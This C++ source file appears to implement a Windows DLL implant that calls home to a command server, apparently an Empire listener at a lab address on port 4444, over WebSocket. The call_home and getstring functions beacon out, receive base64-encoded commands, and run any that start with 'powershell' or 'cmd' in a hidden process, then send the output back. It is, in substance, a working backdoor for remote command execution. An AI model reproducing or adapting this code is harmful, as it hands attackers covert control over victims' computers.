#include "easywsclient.hpp"
//#include "easywsclient.cpp" // <-- include only if you don't want compile separately
#ifdef _WIN32
	#pragma comment( lib, "ws2_32" )
	#include <WinSock2.h>	
#endif
//
#include <assert.h>
#include <stdio.h>
#include <string>
#include "base64.hpp"
//
#define PSE_LIB_EXPORTS
#include "pse.h"
//


static int pipe_read_nowait( HANDLE hPipe, char* pDest, int nMax ){
    DWORD nBytesRead = 0;
    DWORD nAvailBytes;
    char cTmp;

    memset( pDest, 0, nMax );
    // -- check for something in the pipe
    PeekNamedPipe( hPipe, &cTmp, 1, NULL, &nAvailBytes, NULL );
    if ( nAvailBytes == 0 ) {
         return( nBytesRead );
    }
    // OK, something there... read it
    ReadFile( hPipe, pDest, nMax-1, &nBytesRead, NULL);
	//
    return( nBytesRead );
}


static 	std::string exec_and_get_output( const std::string &sCmmd ) {
    SECURITY_ATTRIBUTES rSA =   {0};
    rSA.nLength =               sizeof(SECURITY_ATTRIBUTES);
    rSA.bInheritHandle =        TRUE;
	//
    HANDLE hReadPipe, hWritePipe;
	//
    CreatePipe( &hReadPipe, &hWritePipe, &rSA, 25000 );
	//
    PROCESS_INFORMATION rPI = {0};
    STARTUPINFO         rSI = {0};
    //
	rSI.cb =          sizeof(rSI);
    rSI.dwFlags =     STARTF_USESHOWWINDOW |STARTF_USESTDHANDLES;
    rSI.wShowWindow = SW_HIDE;  // or SW_SHOWNORMAL or SW_MINIMIZE
    rSI.hStdOutput =  hWritePipe;
    rSI.hStdError =   hWritePipe;
	//
	//

   if (!CreateProcess( NULL, (LPSTR)sCmmd.c_str(), NULL, NULL, TRUE, 0, 0, 0, &rSI, &rPI )) {
	     std::string eMsg = "Error creating process to execute command on WS client: [" + sCmmd + "]";	    
         return( eMsg );
    }
   // and process its stdout every 100 ms
   char dest[1000];
   std::string accum = "";   
   DWORD dwRetFromWait = WAIT_TIMEOUT;

   while ( dwRetFromWait != WAIT_OBJECT_0 ) {
        dwRetFromWait = WaitForSingleObject( rPI.hProcess, 100 );
        if ( dwRetFromWait == WAIT_ABANDONED ) {  // crash?
            break;
        }
        //--- else (WAIT_OBJECT_0 or WAIT_TIMEOUT) process the pipe data
        while ( pipe_read_nowait( hReadPipe, dest, sizeof(dest) ) > 0 ) 
			accum += std::string(dest);        
    }
    //
    // tidy up
    CloseHandle( hReadPipe  );
    CloseHandle( hWritePipe );
    CloseHandle( rPI.hThread); 
    CloseHandle( rPI.hProcess);
    // MessageBox("All done!");
	//
	// return output of command on client 
    return( accum );
}

using easywsclient::WebSocket;
static WebSocket::pointer ws = NULL;
std::string gRes = "[*]";

inline std::string encode (const std::string &message) { 
	return base64_encode((BYTE const*)message.c_str(), message.length());
}

inline std::string decode (const std::string &message) { 
	std::vector<BYTE> v = base64_decode(message);
	return std::string( v.begin(), v.end() );
}

// Callback func
void handle_message(const std::string & message)
{
	std::string msg = decode(message);

    printf(">>> %s\n", msg.c_str());
	
    if (msg == "close") {
		ws->send( encode("closing") );
		ws->close();

	} else if(msg == "hello") {
		ws->send( encode("ack") );

	} else if (msg.length() > 0) {
		//gRes = message.c_str();
		if ( msg.find("powershell") == 0  || msg.find("cmd") == 0){	
			std::string res = exec_and_get_output(msg);
			ws->send( encode(res) );
			
		} else {			
		    ws->send( encode("ack") );
		}
	} 
}
extern "C" {
/////////////////////////////////////////////////////////
PSE_LIB__API LPCTSTR __cdecl  getstring(LPCTSTR pUrl)
{
	std::string url = "ws://" + (pUrl != NULL ? std::string(pUrl) : std::string("172.16.155.1:4444/empire"));		//  eg *pUrl = "172.16.155.1:4444/empire",		// vmware address vm8, use ifconfig 
	
#ifdef _WIN32
    INT rc;
    WSADATA wsaData;

    rc = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (rc) {
        //fprintf(stderr, "WSAStartup Failed.\n");
        return NULL;
    }
#endif
	// 
    ws = WebSocket::from_url(url);
	if (!ws) { 
		//fprintf(stderr, "WebSocket: failed to connect to %s\n", url);
		#ifdef _WIN32
			WSACleanup();
		#endif
		return NULL;
	} 

	ws->send( encode( "hello" ) );
	ws->send( encode("bye") );

	while (ws->getReadyState() != WebSocket::CLOSED) {
		ws->poll();
		ws->dispatch(handle_message);
	}

	// cleanup
	delete ws;
	//
#ifdef _WIN32
    WSACleanup();
#endif
	//
    return (LPCTSTR) gRes.c_str();
}


PSE_LIB__API int __cdecl call_home(const std::string &_ip, const std::string &_msg)
{
	// Set some defaults  
	std::string port     = PSE_PORT,				// empire default port
				host     = _ip,		//"172.16.155.1",		// vmware address vm8, use ifconfig 
				endpoint = "empire";			// lol

#ifdef _WIN32
    INT rc;
    WSADATA wsaData;

    rc = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (rc) {
        fprintf(stderr, "WSAStartup Failed.\n");
        return 1;
    }
#endif
	std::string url = "ws://" + host + ":" + port + "/" + endpoint;
	// 
    ws = WebSocket::from_url(url);
	//  assert(ws);
	if (ws) {
		ws->send( encode( "hello" ) );
		if( _msg.length() > 0 ) 
			ws->send( encode( _msg ) );
		//ws->send( encode("bye") );
		while (ws->getReadyState() != WebSocket::CLOSED) {
			ws->poll();
			ws->dispatch(handle_message);
		}
		// cleanup
		delete ws;
	} else { 
		fprintf(stderr, "WebSocket: failed to connect to %s\n", url);
		#ifdef _WIN32
			WSACleanup();
		#endif
		return 1;
	}
	//
#ifdef _WIN32
 //   WSACleanup();
#endif
	//
    return 0;
}
} // extern c

///////////////////////////////////////////////////////////
//PSE_LIB__API int __cdecl call_home(const std::string &_ip, const std::string &_cmmd)
//{
//	// Set some defaults  
//	std::string port     = PSE_PORT,				// empire default port
//				host     = "172.16.155.1",		// vmware address vm8, use ifconfig 
//				endpoint = "empire";			// lol
//
//	host = _ip;
//
//	 // Iff we have commandline parameters...
//     for (int i = 1; i < argc; i++) { 
//         //if (i + 1 != argc) { // Check that we haven't finished parsing already
//             if (argv[i] == "-p") {				// port                 
//                port = std::string(argv[i + 1]);
//             } else if (argv[i] == "-h") {		// host ip
//                host = std::string(argv[i + 1]);
//             } else if (argv[i] == "-e") {		// endpoint
//                endpoint = std::string(argv[i + 1]);
//             } 
//         //}           
//	 }
//	
//#ifdef _WIN32
//    INT rc;
//    WSADATA wsaData;
//
//    rc = WSAStartup(MAKEWORD(2, 2), &wsaData);
//    if (rc) {
//        fprintf(stderr, "WSAStartup Failed.\n");
//        return 1;
//    }
//#endif
//	std::string url = "ws://" + host + ":" + port + "/" + endpoint;
//	// 
//    ws = WebSocket::from_url(url);
//	//  assert(ws);
//	if (ws) {
//		ws->send( encode("hello") );
//		//ws->send( encode("bye") );
//		while (ws->getReadyState() != WebSocket::CLOSED) {
//			ws->poll();
//			ws->dispatch(handle_message);
//		}
//		// cleanup
//		delete ws;
//	} else { 
//		fprintf(stderr, "WebSocket: failed to connect to %s\n", url);
//		#ifdef _WIN32
//			WSACleanup();
//		#endif
//		return 1;
//	}
//	//
//#ifdef _WIN32
//    WSACleanup();
//#endif
//	//
//    return 0;
//}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}